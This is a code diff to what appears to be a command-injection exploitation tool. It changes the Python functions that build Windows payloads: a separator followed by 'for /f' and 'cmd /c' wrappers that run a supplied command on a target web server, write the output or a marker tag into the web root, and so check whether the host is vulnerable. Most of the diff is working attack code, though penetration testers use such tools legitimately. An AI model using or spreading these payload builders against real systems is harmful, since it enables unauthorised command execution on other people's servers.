@@ -27,8 +27,11 @@ File-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
+    cmd = settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'"
     payload = (separator +
-              settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'\""
+              "for /f \"tokens=*\" %i in ('cmd /c \"" +
+              cmd +
+              "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
               )
   else:
     payload = (separator +
@@ -75,11 +78,11 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     payload = (separator + cmd)
 
   elif settings.TARGET_OS == settings.OS.WINDOWS:
-    payload = (separator +
+      cmd = cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
+      payload = (separator +
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
-              "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd +
-              "\")\"') do " + settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + " '%i'" + settings.CMD_NUL
+              "\"') do @set /p = %i " + settings.CMD_NUL
               )
   else:
     settings.USER_SUPPLIED_CMD = cmd
